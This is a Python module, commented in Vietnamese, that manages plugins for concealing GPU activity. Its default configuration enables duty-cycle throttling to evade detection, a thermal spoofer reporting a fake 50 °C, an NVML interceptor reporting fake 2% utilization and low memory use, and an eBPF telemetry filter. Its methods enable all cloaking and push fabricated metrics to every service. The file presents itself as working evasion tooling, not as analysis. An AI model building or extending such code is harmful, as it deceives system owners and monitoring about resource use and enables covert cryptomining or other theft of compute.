"""GPU Plugin Manager - Quản lý centralized tất cả GPU plugins"""
import os
import json
import logging
from typing import Dict, List, Any, Optional
from pathlib import Path

from .interfaces import IGPUPlugin, IGPUCloakService, IGPUTelemetryFilter, IGPUHookManager
from .registry import gpu_plugin_registry

logger = logging.getLogger(__name__)

class GPUPluginManager:
    """Centralized manager cho tất cả GPU plugins"""
    
    def __init__(self, config_path: Optional[str] = None):
        self.config_path = config_path or self._get_default_config_path()
        self.config = self._load_config()
        self.registry = gpu_plugin_registry
        self.active_plugins: Dict[str, IGPUPlugin] = {}
        self.running = False
        
    def _get_default_config_path(self) -> str:
        """Get default configuration file path"""
        return os.path.join(os.path.dirname(__file__), '..', 'config', 'gpu_plugins.yml')
        
    def _load_config(self) -> Dict[str, Any]:
        """Load configuration from file"""
        try:
            if os.path.exists(self.config_path):
                with open(self.config_path, 'r') as f:
                    if self.config_path.endswith('.yml') or self.config_path.endswith('.yaml'):
                        import yaml
                        config = yaml.safe_load(f)
                    else:
                        config = json.load(f)
                logger.info(f"Loaded GPU plugins config from {self.config_path}")
                return config
            else:
                logger.warning(f"Config file not found: {self.config_path}, using defaults")
                return self._get_default_config()
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
            return self._get_default_config()
            
    def _get_default_config(self) -> Dict[str, Any]:
        """Get default configuration"""
        return {
            'plugins': {
                'time_based_cloaking': {
                    'enabled': True,
                    'work_ms': 800,
                    'sleep_ms': 200
                },
                'thermal_spoofer': {
                    'enabled': True,
                    'fake_temperature': 50,
                    'add_noise': True
                },
                'nvml_interceptor': {
                    'enabled': True,
                    'fake_utilization': 2,
                    'fake_memory_used': 100
                },
                'ebpf_filter': {
                    'enabled': True,
                    'mock_mode': 'auto'
                }
            },
            'global': {
                'log_level': 'INFO',
                'enable_monitoring': True
            }
        }
        
    def load_plugin(self, name: str, config: Optional[Dict[str, Any]] = None) -> bool:
        """Load và khởi tạo plugin
        
        Args:
            name: Tên plugin
            config: Cấu hình plugin (optional)
            
        Returns:
            bool: True nếu load thành công
        """
        if name in self.active_plugins:
            logger.info(f"Plugin {name} already loaded")
            return True
            
        # Get plugin config
        plugin_config = config or self.config.get('plugins', {}).get(name, {})
        
        # Check if plugin is enabled
        if not plugin_config.get('enabled', True):
            logger.info(f"Plugin {name} is disabled in config")
            return False
            
        # Create plugin instance
        plugin = self.registry.create_instance(name)
        if not plugin:
            logger.error(f"Failed to create plugin instance: {name}")
            return False
            
        # Initialize plugin
        try:
            if plugin.initialize(plugin_config):
                self.active_plugins[name] = plugin
                logger.info(f"Successfully loaded GPU plugin: {name}")
                return True
            else:
                logger.error(f"Failed to initialize plugin: {name}")
                return False
        except Exception as e:
            logger.error(f"Error initializing plugin {name}: {e}")
            return False
            
    def unload_plugin(self, name: str) -> bool:
        """Unload plugin
        
        Args:
            name: Tên plugin
            
        Returns:
            bool: True nếu unload thành công
        """
        if name not in self.active_plugins:
            logger.warning(f"Plugin {name} is not loaded")
            return False
            
        try:
            self.active_plugins[name].stop()
            del self.active_plugins[name]
            logger.info(f"Successfully unloaded GPU plugin: {name}")
            return True
        except Exception as e:
            logger.error(f"Error unloading plugin {name}: {e}")
            return False
            
    def start_all_plugins(self) -> Dict[str, bool]:
        """Start tất cả loaded plugins
        
        Returns:
            Dict mapping tên plugin -> success status
        """
        results = {}
        for name, plugin in self.active_plugins.items():
            try:
                results[name] = plugin.start()
                if results[name]:
                    logger.info(f"Started GPU plugin: {name}")
                else:
                    logger.error(f"Failed to start GPU plugin: {name}")
            except Exception as e:
                logger.error(f"Error starting plugin {name}: {e}")
                results[name] = False
                
        self.running = True
        return results
        
    def stop_all_plugins(self) -> None:
        """Stop tất cả plugins"""
        for name, plugin in self.active_plugins.items():
            try:
                plugin.stop()
                logger.info(f"Stopped GPU plugin: {name}")
            except Exception as e:
                logger.error(f"Error stopping plugin {name}: {e}")
                
        self.running = False
        
    def get_cloaking_services(self) -> List[IGPUCloakService]:
        """Lấy tất cả cloaking services đang active
        
        Returns:
            List of IGPUCloakService instances
        """
        return [plugin for plugin in self.active_plugins.values() 
                if isinstance(plugin, IGPUCloakService)]
                
    def get_telemetry_filters(self) -> List[IGPUTelemetryFilter]:
        """Lấy tất cả telemetry filters đang active
        
        Returns:
            List of IGPUTelemetryFilter instances
        """
        return [plugin for plugin in self.active_plugins.values() 
                if isinstance(plugin, IGPUTelemetryFilter)]
                
    def get_hook_managers(self) -> List[IGPUHookManager]:
        """Lấy tất cả hook managers đang active
        
        Returns:
            List of IGPUHookManager instances
        """
        return [plugin for plugin in self.active_plugins.values() 
                if isinstance(plugin, IGPUHookManager)]
                
    def enable_all_cloaking(self) -> Dict[str, bool]:
        """Enable tất cả cloaking strategies
        
        Returns:
            Dict mapping service name -> success status
        """
        results = {}
        for service in self.get_cloaking_services():
            try:
                # Get available strategies for this service
                strategies = service.get_active_strategies()
                results[service.name] = service.enable_cloaking(strategies)
            except Exception as e:
                logger.error(f"Error enabling cloaking for {service.name}: {e}")
                results[service.name] = False
                
        return results
        
    def update_all_fake_metrics(self, metrics: Dict[str, int]) -> None:
        """Update fake metrics cho tất cả cloaking services
        
        Args:
            metrics: Dictionary chứa metrics và giá trị fake
        """
        for service in self.get_cloaking_services():
            try:
                service.update_fake_metrics(metrics)
                logger.info(f"Updated fake metrics for {service.name}")
            except Exception as e:
                logger.error(f"Error updating metrics for {service.name}: {e}")
                
    def get_status(self) -> Dict[str, Any]:
        """Lấy trạng thái tổng thể của GPU plugin system
        
        Returns:
            Dict chứa trạng thái system
        """
        plugin_status = {}
        for name, plugin in self.active_plugins.items():
            try:
                plugin_status[name] = plugin.get_status()
            except Exception as e:
                plugin_status[name] = {"error": str(e)}
                
        return {
            'running': self.running,
            'loaded_plugins': list(self.active_plugins.keys()),
            'available_plugins': self.registry.list_plugins(),
            'plugin_status': plugin_status,
            'config': self.config
        }